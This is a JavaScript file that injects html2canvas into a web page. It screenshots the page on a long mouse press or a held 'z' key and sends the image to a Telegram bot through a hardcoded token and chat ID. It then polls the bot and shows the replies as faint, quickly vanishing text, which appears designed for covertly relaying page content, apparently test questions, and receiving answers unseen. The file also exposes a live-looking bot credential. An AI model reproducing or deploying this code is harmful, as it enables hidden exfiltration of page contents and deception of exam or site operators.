// s.js

let pressTimer, keyTimer, lastUpdate = 0;
let botMessages = [];
let activeMsg = null;
let activeMsgs = [];
const BOT_TOKEN = '8355179480:AAES8svdx5Wa08BRiy4tsWtRIxrUyC22jm8';
const CHAT_ID = '7235913446';

const s = document.createElement('script');
s.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
document.head.appendChild(s);

s.onload = function () {
  function d2b(d) {
    let a = d.split(','),
        m = a[0].match(/:(.*?);/)[1],
        b = atob(a[1]),
        n = b.length,
        u = new Uint8Array(n);
    while (n--) {
      u[n] = b.charCodeAt(n);
    }
    return new Blob([u], { type: m });
  }

  function showMsg(txt, isBot = false, autoRemove = true, y = 25) {
    let m = document.createElement('div');
    m.style.position = 'fixed';
    m.style.zIndex = 999999;
    m.style.padding = '2px 4px';
    m.style.fontSize = '10px';
    m.style.borderRadius = '4px';
    m.style.maxWidth = '60%';
    m.style.wordBreak = 'break-word';
    m.style.background = 'transparent';
    m.style.color = 'rgba(128,128,128,0.5)';
    if (isBot) {
      m.style.left = '5px';
      m.style.bottom = y + 'px';
    } else {
      m.style.right = '5px';
      m.style.bottom = '2px';
    }
    m.textContent = txt;
    document.body.appendChild(m);
    if (autoRemove) {
      setTimeout(() => m.remove(), 1250);
    }
    return m;
  }

  function send() {
    html2canvas(document.body).then(c => {
      const d = c.toDataURL('image/png');
      const b = d2b(d);
      const f = new FormData();
      f.append('chat_id', CHAT_ID);
      f.append('photo', b, 'screenshot.png');
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: f
      }).then(r => r.json()).then(res => {
        if (res.ok) {
          showMsg("Screenshot yuborildi!");
        } else {
          showMsg("Xato!");
        }
      }).catch(e => showMsg("Xato!"));
    });
  }

  function poll() {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdate + 1}`)
      .then(r => r.json())
      .then(data => {
        if (data.ok && data.result.length > 0) {
          data.result.forEach(upd => {
            lastUpdate = upd.update_id;
            if (upd.message && upd.message.text) {
              botMessages.push(upd.message.text);
              showMsg(upd.message.text, true);
            }
          });
        }
      }).catch(e => { });
  }

  setInterval(poll, 3000);

  function showPrevMsg() {
    if (botMessages.length > 1) {
      let prevMsg = botMessages[botMessages.length - 2];
      if (activeMsg) activeMsg.remove();
      activeMsg = showMsg(prevMsg, true, false);
    }
  }

  function showAllMsgs() {
    if (botMessages.length > 0) {
      let offset = 25;
      botMessages.forEach((msg, i) => {
        let m = showMsg(msg, true, false, offset);
        activeMsgs.push(m);
        offset += 15;
      });
    }
  }

  function clearAllMsgs() {
    activeMsgs.forEach(m => m.remove());
    activeMsgs = [];
  }

  document.addEventListener('mousedown', e => {
    if (e.button === 0) pressTimer = setTimeout(send, 500);
    if (e.button === 1) showPrevMsg();
  });

  document.addEventListener('mouseup', e => {
    if (e.button === 0) clearTimeout(pressTimer);
    if (e.button === 1) {
      if (activeMsg) {
        activeMsg.remove();
        activeMsg = null;
      }
    }
  });

  document.addEventListener('keydown', e => {
    if (e.key === 'z' || e.key === 'Z') {
      if (!keyTimer) keyTimer = setTimeout(send, 500);
    }
    if (e.key === 'x' || e.key === 'X') {
      showPrevMsg();
    }
    if (e.key === 'q' || e.key === 'Q') {
      if (activeMsgs.length === 0) showAllMsgs();
    }
  });

  document.addEventListener('keyup', e => {
    if (e.key === 'z' || e.key === 'Z') {
      clearTimeout(keyTimer);
      keyTimer = null;
    }
    if (e.key === 'x' || e.key === 'X') {
      if (activeMsg) {
        activeMsg.remove();
        activeMsg = null;
      }
    }
    if (e.key === 'q' || e.key === 'Q') {
      clearAllMsgs();
    }
  });
};
